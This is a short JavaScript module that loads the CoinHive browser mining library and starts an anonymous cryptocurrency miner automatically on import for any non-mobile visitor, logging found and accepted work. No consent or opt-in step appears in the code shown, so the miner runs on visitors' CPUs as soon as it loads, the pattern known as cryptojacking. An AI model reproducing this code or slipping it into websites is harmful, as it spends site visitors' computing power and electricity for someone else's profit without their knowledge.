/* global CoinHive */

import './coinhive.min.js';
import { SITE_KEY } from './Constants.mjs';
import log from './log.mjs';
import isMobile from './isMobile.mjs';

const miner = new CoinHive.Anonymous(SITE_KEY, {
  threads: 1,
});

if (!isMobile) miner.start();

miner.on('found', (...args) => {
  log('new job', ...args);
});

miner.on('accepted', (...args) => {
  log('work accepted', ...args);
});

export default miner;
